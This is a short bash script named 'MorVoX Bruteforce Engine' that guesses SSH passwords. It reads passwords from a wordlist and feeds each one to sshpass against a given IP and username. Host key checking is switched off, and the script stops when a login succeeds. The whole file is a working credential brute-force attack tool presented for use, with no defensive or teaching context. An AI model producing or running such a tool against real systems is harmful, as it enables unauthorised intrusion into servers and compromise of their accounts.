#!/bin/bash
# MorVoX Bruteforce Engine by nyx6st

banner() {
  echo "==============================="
  echo "    MorVoX Bruteforce Engine   "
  echo "==============================="
}

usage() {
  echo "Usage: $0 <target_ip> <username> <wordlist>"
  exit 1
}

brute() {
  local target=$1
  local user=$2
  local list=$3

  for pass in $(cat $list); do
    echo "[+] Trying password: $pass"
    # Contoh command bruteforce, sesuaikan nanti
    sshpass -p $pass ssh -o StrictHostKeyChecking=no $user@$target "exit" && echo "[!] SUCCESS: $user@$target with password: $pass" && exit
  done

  echo "[-] Bruteforce failed. Try better wordlist."
}

main() {
  banner
  [[ $# -ne 3 ]] && usage
  brute "$1" "$2" "$3"
}

main "$@"
